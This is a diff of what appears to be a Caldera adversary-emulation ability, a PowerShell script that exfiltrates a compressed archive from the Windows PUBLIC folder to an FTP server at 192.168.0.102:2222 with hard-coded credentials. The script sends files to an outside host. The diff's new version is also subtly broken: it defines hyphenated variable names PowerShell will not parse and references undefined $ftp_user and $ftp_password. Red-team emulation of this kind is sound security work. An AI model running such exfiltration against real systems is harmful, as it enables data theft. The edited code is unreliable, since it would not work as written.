@@ -1,16 +1,15 @@
-- additional_info: {}
-  privilege: ''
-  plugin: stockpile
-  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+- tactic: exfiltration
+  requirements: []
+  technique_id: T1048.003
+  plugin: ''
   buckets:
   - exfiltration
+  privilege: ''
+  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
   singleton: false
-  tactic: exfiltration
-  technique_id: T1048.003
-  access: {}
-  delete_payload: true
   executors:
   - platform: windows
+    payloads: []
     command: '$SourceFile = "data.zip";
 
       $SourceDirectory = "$env:PUBLIC\";
@@ -19,13 +18,26 @@
 
       $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-$SourceFile";
 
-      $ftp = [System.Net.FtpWebRequest]::Create("ftp://192.168.0.102:2222/$RemoteName");
+      $ftp-server-url="ftp://192.168.0.102";
+
+      $ftp-server-port="2222";
+
+      $ftp-user="caldera_user";
+
+      $ftp-password="caldera";
+
+      $colomn=":";
+
+      $slash="/";
+
+
+      $ftp = [System.Net.FtpWebRequest]::Create("$ftp-server-url$colomn$ftp-server-port$slash$RemoteName");
 
       $ftp = [System.Net.FTPWebRequest]$ftp;
 
       $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
 
-      $ftp.Credentials = New-Object System.Net.NetworkCredential("caldera_user", "caldera");
+      $ftp.Credentials = New-Object System.Net.NetworkCredential("$ftp_user", "$ftp_password");
 
       $ftp.UseBinary = $true;
 
@@ -44,22 +56,20 @@
       $requestStream.Close();
 
       $requestStream.Dispose();'
-    additional_info: {}
-    code: null
-    cleanup: []
-    timeout: 60
     parsers: []
     variations: []
-    payloads: []
-    language: null
     build_target: null
     uploads: []
+    code: null
+    timeout: 60
+    cleanup: []
+    additional_info: {}
     name: psh
-  requirements:
-  - relationship_match:
-    - source: host.dir.compress
-    module: plugins.stockpile.app.requirements.paw_provenance
-  repeatable: false
-  description: Exfiltrates a compressed archive to an FTP server.
+    language: null
+  additional_info: {}
+  access: {}
   name: Exfiltration of a Compressed Archive to FTP Server
+  description: Exfiltrates a compressed archive to a FTP server.
+  delete_payload: true
+  repeatable: false
   id: ftp_archive_exfiltration
